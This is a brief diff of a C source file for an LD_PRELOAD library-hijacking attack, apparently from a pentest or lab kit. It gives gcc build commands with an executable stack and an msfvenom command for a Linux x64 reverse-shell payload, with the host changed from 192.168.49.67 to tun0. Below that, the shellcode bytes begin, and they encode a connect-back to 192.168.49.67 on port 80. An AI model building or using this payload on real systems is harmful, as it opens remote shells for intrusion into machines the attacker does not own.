@@ -9,7 +9,7 @@
 // gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
 // gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl
 
-// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f c
+// msfvenom -p linux/x64/shell_reverse_tcp prependfork=true LHOST=tun0 LPORT=443 -f c
 unsigned char buf[] = 
 "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
 "\xb9\x02\x00\x00\x50\xc0\xa8\x31\x43\x51\x48\x89\xe6\x6a\x10"
